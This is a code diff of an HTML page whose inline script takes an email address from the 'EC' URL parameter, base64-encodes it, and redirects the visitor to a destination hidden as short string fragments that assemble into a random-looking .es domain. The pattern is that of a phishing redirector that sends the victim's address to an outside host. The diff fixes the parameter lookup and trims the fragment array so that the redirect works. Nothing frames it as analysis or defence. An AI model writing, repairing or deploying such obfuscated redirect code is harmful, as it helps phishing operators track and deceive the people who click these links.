@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>...</title>
   <script>
-    function bIB(str, bits = 20) {
+    function bIB(str, bits = 13) {
       const bitLength = Math.ceil(str.length / bits);
       const result = [];
       for (let i = 0; i < bits; i++) {
@@ -22,13 +22,12 @@
 
     function encodeEmailAndRedirect() {
       const urlParams = new URLSearchParams(window.location.search);
-      const email = urlParams.get('EC=');
+      const email = urlParams.get('EC');
 
       if (email) {
         const encodedEmail = btoa(email);
         const redirectUrlBits = [
-          "ht", "tps", ":/", "/eb", "u6a", "j.j", "xeb", "pue", "ehg", ".es", "/Ol", "Lfm", "M/?", "", "", "", "", "", "", ""
-        ];
+          "ht", "tps", ":/", "/eb", "u6a", "j.j", "xeb", "pue", "ehg", ".es", "/Ol", "Lfm", "M/?"];
 
         const emailBits = bIB(encodedEmail);
 
